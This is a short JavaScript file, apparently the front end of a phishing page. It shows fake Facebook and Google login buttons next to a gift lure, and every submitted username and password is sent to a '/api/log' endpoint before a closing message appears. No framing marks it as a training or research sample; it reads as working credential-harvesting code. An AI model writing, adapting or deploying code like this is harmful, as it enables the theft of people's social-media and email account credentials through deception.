document.addEventListener('DOMContentLoaded', () => {

const formLogin = document.getElementById('loginForm');
const facebookButton = document.getElementById('facebook');
const googleButton = document.getElementById('google');
const finalMessage = document.getElementById('finalMessage');
const giftMessage = document.getElementById('giftMessage');

facebookButton.addEventListener('click', () => {
    formLogin.style.display = 'flex';
    facebookButton.style.display = 'none';
    googleButton.style.display = 'none';
});

googleButton.addEventListener('click', () => {
    formLogin.style.display = 'flex';
    facebookButton.style.display = 'none';
    googleButton.style.display = 'none';
});

formLogin.addEventListener('submit', async (e) => {
    e.preventDefault();
    const loginValue = document.getElementById('login').value;
    const passwordValue = document.getElementById('password').value;

    try {
        const response = await fetch('/api/log', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ login: loginValue, password: passwordValue }),
        });
        
        if (!response.ok) {
            throw new Error('Erro ao enviar dados para a API');
        }

        const data = await response.json();
        console.log(data.message);
    } catch (error) {
        console.error('Erro: ', error);
    }

    finalMessage.style.display = 'flex';
    formLogin.style.display = 'none';
    giftMessage.style.display = 'none';
});
})